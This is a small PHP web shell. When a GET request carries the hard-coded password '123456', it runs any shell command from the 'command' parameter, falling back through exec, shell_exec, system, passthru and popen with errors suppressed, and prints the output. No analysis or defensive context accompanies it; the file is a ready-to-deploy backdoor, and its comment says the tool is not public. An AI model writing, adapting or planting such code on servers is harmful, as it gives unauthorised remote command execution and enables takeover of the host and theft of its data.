<?php
//password protection,this tool is not provided in public 
function shell($cmd)
{
  global $lang;
 $ret = '';
 if (!empty($cmd))
 {
  if(function_exists('exec')){@exec($cmd,$ret);$ret = join("\n",$ret);}
  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}
  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(@is_resource($f = @popen($cmd,"r"))){$ret = "";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}
  else $ret=$lang['allfuncsh'];
 }
 return $ret;
}
$action=$_GET['password'];
$act=array('
password');if($action=="123456")
{
echo "$. ";
$command=$_GET['command'];
//echo $action;
echo shell($command);
}
?>
